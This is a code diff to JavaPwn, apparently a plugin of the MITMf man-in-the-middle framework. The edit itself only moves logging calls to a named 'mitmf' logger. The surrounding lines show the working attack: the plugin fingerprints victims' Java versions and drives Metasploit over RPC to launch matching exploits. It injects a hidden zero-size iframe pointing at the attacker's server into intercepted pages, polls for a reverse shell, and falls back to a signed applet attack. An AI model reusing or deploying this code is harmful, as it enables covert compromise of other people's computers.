@@ -35,6 +35,7 @@ from scapy.all import get_if_addr
 requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
 requests_log.setLevel(logging.WARNING)
 
+mitmf_logger = logging.getLogger('mitmf')
 
 class JavaPwn(BrowserProfiler, Plugin):
     name     = "JavaPwn"
@@ -118,10 +119,10 @@ class JavaPwn(BrowserProfiler, Plugin):
 
     def injectWait(self, msfinstance, url, client_ip):  #here we inject an iframe to trigger the exploit and check for resulting sessions
         #inject iframe
-        logging.info("%s >> now injecting iframe to trigger exploit" % client_ip)
+        mitmf_logger.info("%s >> now injecting iframe to trigger exploit" % client_ip)
         self.html_payload = "<iframe src='http://%s:%s%s' height=0%% width=0%%></iframe>" % (self.msfip, self.msfport, url) #temporarily changes the code that the Browserprofiler plugin injects
 
-        logging.info('%s >> waiting for ze shellz, Please wait...' % client_ip)
+        mitmf_logger.info('%s >> waiting for ze shellz, Please wait...' % client_ip)
 
         exit = False
         i = 1
@@ -132,7 +133,7 @@ class JavaPwn(BrowserProfiler, Plugin):
             if len(shell) > 0:
                 for k, v in shell.iteritems():
                     if client_ip in shell[k]['tunnel_peer']:  #make sure the shell actually came from the ip that we targeted
-                        logging.info("%s >> Got shell!" % client_ip)
+                        mitmf_logger.info("%s >> Got shell!" % client_ip)
                         self.sploited_ips.append(client_ip)  #target successfuly exploited :)
                         self.black_ips = self.sploited_ips   #Add to inject blacklist since box has been popped
                         exit = True
@@ -141,13 +142,13 @@ class JavaPwn(BrowserProfiler, Plugin):
             i += 1
 
         if exit is False:  #We didn't get a shell :(
-            logging.info("%s >> session not established after 30 seconds" % client_ip)
+            mitmf_logger.info("%s >> session not established after 30 seconds" % client_ip)
 
         self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin
 
     def send_command(self, cmd, msf, vic_ip):
         try:
-            logging.info("%s >> sending commands to metasploit" % vic_ip)
+            mitmf_logger.info("%s >> sending commands to metasploit" % vic_ip)
 
             #Create a virtual console
             console_id = msf.call('console.create')['id']
@@ -155,9 +156,9 @@ class JavaPwn(BrowserProfiler, Plugin):
             #write the cmd to the newly created console
             msf.call('console.write', [console_id, cmd])
 
-            logging.info("%s >> commands sent succesfully" % vic_ip)
+            mitmf_logger.info("%s >> commands sent succesfully" % vic_ip)
         except Exception, e:
-            logging.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))  
+            mitmf_logger.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))  
 
     def pwn(self, msf):
         while True:
@@ -169,19 +170,19 @@ class JavaPwn(BrowserProfiler, Plugin):
 
                     vic_ip = brwprofile['ip']
 
-                    logging.info("%s >> client has java version %s installed! Proceeding..." % (vic_ip, brwprofile['java_version']))
-                    logging.info("%s >> Choosing exploit based on version string" % vic_ip)
+                    mitmf_logger.info("%s >> client has java version %s installed! Proceeding..." % (vic_ip, brwprofile['java_version']))
+                    mitmf_logger.info("%s >> Choosing exploit based on version string" % vic_ip)
 
                     exploits = self.get_exploit(brwprofile['java_version']) # get correct exploit strings defined in javapwn.cfg
 
                     if exploits:
 
                         if len(exploits) > 1:
-                            logging.info("%s >> client is vulnerable to %s exploits!" % (vic_ip, len(exploits)))
+                            mitmf_logger.info("%s >> client is vulnerable to %s exploits!" % (vic_ip, len(exploits)))
                             exploit = random.choice(exploits)
-                            logging.info("%s >> choosing %s" %(vic_ip, exploit))
+                            mitmf_logger.info("%s >> choosing %s" %(vic_ip, exploit))
                         else:
-                            logging.info("%s >> client is vulnerable to %s!" % (vic_ip, exploits[0]))
+                            mitmf_logger.info("%s >> client is vulnerable to %s!" % (vic_ip, exploits[0]))
                             exploit = exploits[0]
 
                         #here we check to see if we already set up the exploit to avoid creating new jobs for no reason
@@ -190,7 +191,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                             for k, v in jobs.iteritems():
                                 info = msf.call('job.info', [k])
                                 if exploit in info['name']:
-                                    logging.info('%s >> %s already started' % (vic_ip, exploit))
+                                    mitmf_logger.info('%s >> %s already started' % (vic_ip, exploit))
                                     url = info['uripath']  #get the url assigned to the exploit
                                     self.injectWait(msf, url, vic_ip)
 
@@ -207,15 +208,15 @@ class JavaPwn(BrowserProfiler, Plugin):
                             cmd += "set LPORT %s\n" % rand_port
                             cmd += "exploit -j\n"
 
-                            logging.debug("command string:\n%s" % cmd)
+                            mitmf_logger.debug("command string:\n%s" % cmd)
 
                             self.send_command(cmd, msf, vic_ip)
 
                             self.injectWait(msf, rand_url, vic_ip)
                     else:
                         #this might be removed in the future since newer versions of Java break the signed applet attack (unless you have a valid cert)
-                        logging.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
-                        logging.info("%s >> falling back to the signed applet attack" % vic_ip)
+                        mitmf_logger.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
+                        mitmf_logger.info("%s >> falling back to the signed applet attack" % vic_ip)
 
                         rand_url = self.rand_url()
                         rand_port = random.randint(1000, 65535)
